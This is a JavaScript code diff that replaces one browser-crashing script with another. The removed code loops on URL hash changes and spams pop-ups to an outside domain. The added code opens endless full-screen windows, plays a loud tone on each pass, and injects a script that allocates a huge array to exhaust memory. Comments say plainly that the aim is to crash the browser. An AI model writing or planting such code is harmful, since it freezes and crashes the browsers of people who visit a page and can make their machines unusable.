@@ -1,28 +1,6 @@
-function recursor() {
-  //Change hash of current URL
-  window.location.hash = Math.random();
-  //Recurse on hash changes
-  window.addEventListener('hashchange', function() {
-    recursor();
-  });
-};
-
-function detectPopupBlocker() {
-  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
-  if (!myTest) 
-  { // Tests for pop-up blocker ^
-    setTimeout(function() {
-      recursor();
-    }, 1500);
-//Runs recursory code after 5000 millisecond delay ^ (crashes chrome)
-  } else {
-    myTest.close();
-    while (true) {
-      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
-      var URL = "http://kplibrary.cf" + location.href;
-      var win = window.open(URL, "_blank", strWindowFeatures);
-      //If no pop-up blocker spams a shit ton of pop-ups
-    }
-  }
+while(true) {
+  var a=Math.floor(10000*Math.random()+1),
+  b=window.open('_blank','Lag'+a,`height=${screen.height},width=${screen.width}`);
+  au=new AudioContext(); v=au.createOscillator(); u=au.createGain(); v.connect(u); v.frequency.value=130; v.type="square"; u.connect(au.destination); u.gain.value=100*0.01; v.start(au.currentTime); v.stop(au.currentTime+300*0.001);
+  b.document.body.innerHTML='<script>[...Array(2**32-1)]</script>';
 }
-detectPopupBlocker();
